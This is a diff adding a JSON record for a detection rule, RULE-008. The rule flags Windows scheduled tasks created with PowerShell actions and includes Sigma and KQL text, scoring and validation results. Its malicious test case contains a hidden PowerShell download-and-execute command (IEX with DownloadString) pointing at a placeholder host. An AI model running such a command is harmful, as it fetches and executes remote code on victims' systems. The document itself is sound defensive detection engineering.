@@ -1,0 +1,126 @@
+{
+  "id": "RULE-008",
+  "name": "Windows Scheduled Task Created with Suspicious Action",
+  "title": "Windows Scheduled Task Created with Suspicious Action",
+  "description": "Detects scheduled task creation where the task action includes PowerShell, often used for persistence.",
+  "sigma_path": "/Users/Dhey/Desktop/Project_Github/detection-pack-lab/rules/sigma/RULE-008-windows-scheduled-task-created.yml",
+  "elastic_path": "/Users/Dhey/Desktop/Project_Github/detection-pack-lab/rules/elastic/RULE-008-windows-scheduled-task-created.kql",
+  "sigma_text": "title: Windows Scheduled Task Created with Suspicious Action\nid: RULE-008\ndescription: Detects scheduled task creation where the task action includes PowerShell, often used for persistence.\nauthor: detpack-lab\nstatus: stable\nlogsource:\n  product: windows\n  service: security\ndetection:\n  selection:\n    EventID: 4698\n    TaskContent|contains:\n      - powershell\n      - PowerShell\n  condition: selection\nfalsepositives:\n  - Legitimate admin automation using scheduled tasks\nlevel: medium\ntags:\n  - attack.t1053\n  - attack.persistence\n\n",
+  "elastic_text": "EventID:4698 and (TaskContent:*powershell* or TaskContent:*PowerShell*)",
+  "elastic_kql": "EventID:4698 and (TaskContent:*powershell* or TaskContent:*PowerShell*)",
+  "elastic_esql": "FROM logs | WHERE EventID:4698 and (TaskContent:*powershell* or TaskContent:*PowerShell*)",
+  "logsource": "windows/security",
+  "tags": [
+    "attack.t1053",
+    "attack.persistence"
+  ],
+  "tactic": "Persistence",
+  "techniques": [
+    "T1053"
+  ],
+  "severity": "medium",
+  "status": "passing",
+  "confidence": 72,
+  "noise_risk": 35,
+  "quality_score": 69,
+  "fields_used": [
+    "EventID",
+    "TaskContent"
+  ],
+  "false_positive_notes": [
+    "Legitimate admin automation using scheduled tasks"
+  ],
+  "tuning_knobs": [
+    {
+      "name": "allowlist.principal",
+      "description": "Exclude known admin/automation principals that legitimately trigger this behavior.",
+      "default": "[]"
+    },
+    {
+      "name": "allowlist.hosts",
+      "description": "Exclude known management hosts or jump boxes that legitimately perform the action.",
+      "default": "[]"
+    }
+  ],
+  "score_breakdown": {
+    "passed": true,
+    "severity": "medium",
+    "fields_used": [
+      "EventID",
+      "TaskContent"
+    ],
+    "contains_or_regex_clauses": 1,
+    "has_false_positive_notes": true,
+    "status": "stable"
+  },
+  "compiled": {
+    "condition": "selection",
+    "selections": {
+      "selection": [
+        {
+          "field": "EventID",
+          "op": "eq",
+          "values": [
+            4698
+          ]
+        },
+        {
+          "field": "TaskContent",
+          "op": "contains",
+          "values": [
+            "powershell",
+            "PowerShell"
+          ]
+        }
+      ]
+    }
+  },
+  "validation": {
+    "tests": [
+      {
+        "case": "benign",
+        "events": 3,
+        "expected_alerts": 0,
+        "actual_alerts": 0,
+        "time_to_detect_ms": 0,
+        "passed": true,
+        "why": {
+          "matched_fields": [
+            {
+              "field": "EventID",
+              "value": "4698"
+            }
+          ],
+          "failed_clause": "TaskContent contains ['powershell', 'PowerShell']",
+          "missing_fields": []
+        }
+      },
+      {
+        "case": "malicious",
+        "events": 2,
+        "expected_alerts": 1,
+        "actual_alerts": 1,
+        "time_to_detect_ms": 0,
+        "passed": true,
+        "why": {
+          "matched_fields": [
+            {
+              "field": "EventID",
+              "value": "4698"
+            },
+            {
+              "field": "TaskContent",
+              "value": "<Command>powershell.exe -WindowStyle Hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example')</Command>"
+            }
+          ],
+          "failed_clause": null,
+          "missing_fields": []
+        }
+      }
+    ],
+    "summary": {
+      "alerts_expected": 1,
+      "alerts_actual": 1
+    }
+  }
+}
